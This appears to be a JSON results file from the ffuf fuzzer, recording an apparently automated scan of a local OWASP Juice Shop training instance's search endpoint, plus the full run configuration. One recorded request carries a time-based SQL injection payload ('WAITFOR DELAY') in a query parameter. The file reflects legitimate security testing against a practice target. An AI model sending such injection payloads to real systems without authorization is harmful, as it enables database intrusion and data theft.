{"commandline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/500c601b-7333-4ceb-bed9-c392dfeb6b55.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755762738379.json -u http://localhost:8082/juice-shop/juice-shop/search?l=solidity\u0026l=FUZZ","time":"2025-08-21T15:52:18+08:00","results":[{"input":{"FFUFHASH":"338111","FUZZ":"gKpKqiPN"},"position":1,"status":400,"length":0,"words":1,"lines":1,"content-type":"","redirectlocation":"","scraper":{},"duration":760584,"resultfile":"","url":"http://localhost:8082/juice-shop/juice-shop/search?l=solidity\u0026l=';WAITFOR DELAY '0:0:5'--","host":"localhost:8082"}],"config":{"autocalibration":true,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/500c601b-7333-4ceb-bed9-c392dfeb6b55.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755762738379.json -u http://localhost:8082/juice-shop/juice-shop/search?l=solidity\u0026l=FUZZ","configfile":"","postdata":"","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/Users/raphaelpang/code/elise/payloads/temp/500c601b-7333-4ceb-bed9-c392dfeb6b55.txt","encoders":"","template":""}],"inputshell":"","json":true,"matchers":{"IsCalibrated":true,"Mutex":{},"Matchers":{"status":{"value":"200,302,400,401,403,404,500"}},"Filters":{"size":{"value":"80117"}},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"GET","noninteractive":false,"outputdirectory":"","outputfile":"/Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755762738379.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":0,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":25,"timeout":30,"url":"http://localhost:8082/juice-shop/juice-shop/search?l=solidity\u0026l=FUZZ","verbose":false,"wordlists":["/Users/raphaelpang/code/elise/payloads/temp/500c601b-7333-4ceb-bed9-c392dfeb6b55.txt"],"http2":false,"client-cert":"","client-key":""}}